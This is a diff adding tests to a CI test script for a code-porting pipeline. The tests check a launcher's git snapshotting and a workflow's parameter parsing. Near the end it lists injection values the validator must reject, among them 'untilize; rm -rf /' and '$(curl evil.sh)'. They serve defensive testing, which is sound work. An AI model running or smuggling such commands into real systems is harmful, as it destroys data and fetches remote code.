@@ -318,6 +318,160 @@ samples, notes = attribute(slipped, order)
 check("a slip within one case and leg is still caught", not samples and any("inconclusive" in n for n in notes),
       str(notes))
 
+# --------------------------------------------------------------------------------------------
+# dispatch.py: what it does to the working tree before anything leaves the machine.
+#
+# The launcher runs in the agent's job, on the agent's checkout, and everything downstream depends
+# on it snapshotting exactly the right thing: the scaffolded stubs (untracked), the tracked edits,
+# and neither the generator checkout nor build output. It also must not disturb the tree it is
+# snapshotting, because the agent is still working in it. None of that is observable from a
+# workflow run until 25 minutes in, and all of it is checkable here in a second.
+
+import subprocess  # noqa: E402
+
+import dispatch  # noqa: E402
+
+
+def _git(repo, *args):
+    return subprocess.run(["git", *args], cwd=repo, capture_output=True, text=True, check=True).stdout.strip()
+
+
+with tempfile.TemporaryDirectory() as tmp:
+    repo = Path(tmp) / "repo"
+    work = Path(tmp) / "work"
+    (repo / ".git").mkdir(parents=True)
+    work.mkdir()
+    _git(repo, "init", "-q", ".")
+    _git(repo, "config", "user.email", "t@t.co")
+    _git(repo, "config", "user.name", "t")
+    (repo / "tracked.txt").write_text("base\n")
+    (repo / ".gitignore").write_text("build/\n")
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-qm", "base")
+    (repo / ".git" / "info").mkdir(exist_ok=True)
+    (repo / ".git" / "info" / "exclude").write_text(".codegen/\n")
+
+    # The state the launcher meets: a scaffolded stub, an edit, the generator checkout, build output.
+    stub = repo / "ttnn/cpp/ttnn/operations/data_movement/untilize/codegen"
+    stub.mkdir(parents=True)
+    (stub / "factory.cpp").write_text("// filled in by the agent\n")
+    (repo / ".codegen/agentic_port").mkdir(parents=True)
+    (repo / ".codegen/agentic_port/builder.py").write_text("generator\n")
+    (repo / "build").mkdir()
+    (repo / "build/lib.so").write_text("artifact\n")
+    (repo / "tracked.txt").write_text("edited\n")
+
+    # Something staged, to prove the scratch index does not collide with the agent's.
+    _git(repo, "add", "tracked.txt")
+    staged_before = _git(repo, "diff", "--cached", "--name-only")
+
+    base_before = _git(repo, "rev-parse", "HEAD")
+    commit, base = dispatch.commit_worktree(repo, work, "test")
+    listed = _git(repo, "ls-tree", "-r", "--name-only", commit).splitlines()
+
+    check("the scratch commit carries the untracked scaffolded stubs",
+          "ttnn/cpp/ttnn/operations/data_movement/untilize/codegen/factory.cpp" in listed, str(listed))
+    check("the scratch commit carries tracked edits",
+          _git(repo, "show", f"{commit}:tracked.txt") == "edited", str(listed))
+    check("the generator checkout is excluded",
+          not any(p.startswith(".codegen/") for p in listed), str(listed))
+    check("build output is excluded", not any(p.startswith("build/") for p in listed), str(listed))
+    check("the commit is parented on the base", _git(repo, "rev-parse", f"{commit}^") == base_before)
+    check("exactly one commit above the base, so a depth-1 fetch finds it",
+          _git(repo, "rev-list", "--count", f"{base_before}..{commit}") == "1")
+    check("HEAD does not move", _git(repo, "rev-parse", "HEAD") == base_before)
+    check("the agent's index is untouched", _git(repo, "diff", "--cached", "--name-only") == staged_before)
+    check("the reported base is HEAD", base == base_before)
+
+    # Called twice without an intervening change: same tree, and no leftover index to trip over.
+    again, _ = dispatch.commit_worktree(repo, work, "test")
+    check("a second call snapshots the same tree",
+          _git(repo, "rev-parse", f"{commit}^{{tree}}") == _git(repo, "rev-parse", f"{again}^{{tree}}"))
+
+    # The baseline dispatch hands the routing test back inside `workspace/`, at its repo-relative
+    # path, and the launcher has to place it without being told where it belongs.
+    results = Path(tmp) / "results"
+    rel = "tests/ttnn/nightly/unit_tests/operations/data_movement/test_untilize_codegen_routing.py"
+    (results / "workspace" / rel).parent.mkdir(parents=True)
+    (results / "workspace" / rel).write_text("# generated\n")
+    (results / "gate.json").write_text("{}")
+    adopted = dispatch.adopt_workspace(results, repo)
+    check("the generated test is laid down at its repo-relative path", adopted == [rel], str(adopted))
+    check("only workspace/ is adopted, not the verdict", (repo / rel).is_file() and not (repo / "gate.json").exists())
+
+# --------------------------------------------------------------------------------------------
+# The seam between the launcher and the workflow: parameters ride in the scratch commit message,
+# and port-measure.yaml's `resolve` job reads them back. The two halves live in different files and
+# different languages, and nothing in either would notice if they stopped agreeing -- the symptom
+# would be a run that dies in its first job, 20 minutes after the agent asked for it.
+#
+# So the checker below is the real one, lifted out of the YAML rather than reimplemented. It also
+# stands in for the validation itself: every one of these values is interpolated into a shell
+# command on the device runner.
+
+import os  # noqa: E402
+
+import yaml  # noqa: E402
+
+WORKFLOW = Path(__file__).resolve().parents[2] / "workflows" / "port-measure.yaml"
+
+
+def _resolve(message: str) -> tuple[int, dict]:
+    """Run port-measure.yaml's `resolve` step the way Actions would, on `message`."""
+    body = yaml.safe_load(WORKFLOW.read_text())["jobs"]["resolve"]["steps"][0]["run"]
+    script = body.split("<<'PY'", 1)[1].rsplit("PY", 1)[0]
+    with tempfile.TemporaryDirectory() as tmp:
+        out = Path(tmp) / "out"
+        out.touch()
+        done = subprocess.run(
+            [sys.executable, "-c", script],
+            capture_output=True,
+            text=True,
+            env={**os.environ, "PORT_PARAMS": message, "GITHUB_OUTPUT": str(out)},
+        )
+        parsed = dict(
+            line.split("=", 1) for line in out.read_text().splitlines() if "=" in line
+        )
+    return done.returncode, parsed
+
+
+sent = {
+    "mode": "verify",
+    "band": "correctness",
+    "op": "untilize",
+    "category": "data_movement",
+    "codegen-ref": "codegen_agentic_port",
+    "perf-limit": "24",
+    "base-sha": "a" * 40,
+    "runner-label": '["tt-ubuntu-2204-N150-viommu-stable"]',
+    "nonce": "1-abc",
+}
+code, got = _resolve(json.dumps(sent, separators=(",", ":")))
+check("the workflow accepts what the launcher writes", code == 0, f"exit {code}")
+check(
+    "every parameter survives the commit message intact",
+    all(got.get(k) == v for k, v in sent.items() if k != "nonce"),
+    f"sent {sent}, got {got}",
+)
+
+# Defaults, because the launcher may legitimately omit the optional half.
+code, got = _resolve('{"mode":"build"}')
+check("a minimal message resolves to defaults", code == 0 and got.get("op") == "untilize", str(got))
+
+# Nothing here should ever reach a shell able to act on it.
+for label, message in [
+    ("a shell metacharacter in op", '{"mode":"verify","op":"untilize; rm -rf /"}'),
+    ("a command substitution in op", '{"mode":"verify","op":"$(curl evil.sh)"}'),
+    ("an unknown mode", '{"mode":"nonsense"}'),
+    ("an injected band", '{"mode":"verify","band":"; echo pwned"}'),
+    ("a non-numeric perf-limit", '{"mode":"verify","perf-limit":"1e9"}'),
+    ("a base-sha that is not a sha", '{"mode":"verify","base-sha":"not-a-sha"}'),
+    ("a runner label with a space in it", '{"mode":"verify","runner-label":"[\\"a b; halt\\"]"}'),
+    ("a message that is not JSON at all", "wip: fixing the thing"),
+]:
+    code, _ = _resolve(message)
+    check(f"the workflow rejects {label}", code != 0, "it was accepted")
+
 print()
 print(f"{len(failures)} failure(s)" + (": " + ", ".join(failures) if failures else ""))
 sys.exit(1 if failures else 0)
